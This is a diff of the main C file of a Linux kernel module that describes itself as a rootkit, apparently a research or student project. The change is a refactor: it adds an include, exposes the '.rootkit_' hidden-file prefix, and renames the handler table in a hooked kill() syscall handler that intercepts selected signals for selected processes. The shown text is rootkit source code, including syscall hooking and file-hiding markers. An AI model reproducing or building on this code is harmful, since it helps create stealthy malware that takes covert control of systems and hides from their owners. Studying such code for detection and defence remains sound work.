@@ -1,5 +1,6 @@
 #include "inc/rootkit_main.h"
 
+#include "inc/constants.h"
 #include "inc/files.h"
 #include "inc/hooking.h"
 #include "inc/macro_utils.h"
@@ -19,8 +20,7 @@ MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
-static const char S_HIDDEN_PREFIX[] = ".rootkit_";
-#define SZ_HIDDEN_PREFIX_LEN (sizeof(S_HIDDEN_PREFIX) - 1)
+const char S_HIDDEN_PREFIX[] = ".rootkit_";
 
 static int __init rootkit_init(void)
 {
@@ -360,11 +360,11 @@ SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
 
     pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);
 
-    for (i = 0; i < ARRAY_SIZE(p_sig_handlers); ++i) {
-        IF_U ((p_sig_handlers[i].i32_pid < 0 || p_sig_handlers[i].i32_pid == i32_pid) &&
-              (p_sig_handlers[i].i32_sig < 0 || p_sig_handlers[i].i32_sig == i32_sig)) {
+    for (i = 0; i < ARRAY_SIZE(P_SIG_HANDLERS); ++i) {
+        IF_U ((P_SIG_HANDLERS[i].i32_pid < 0 || P_SIG_HANDLERS[i].i32_pid == i32_pid) &&
+              (P_SIG_HANDLERS[i].i32_sig < 0 || P_SIG_HANDLERS[i].i32_sig == i32_sig)) {
             pr_info("[ROOTKIT] * Intercepting signal %d for PID %d\n", i32_sig, i32_pid);
-            p_sig_handlers[i].sig_handler(i32_pid, i32_sig);
+            P_SIG_HANDLERS[i].sig_handler(i32_pid, i32_sig);
 
             // Signal was intercepted, return success
             return 0;
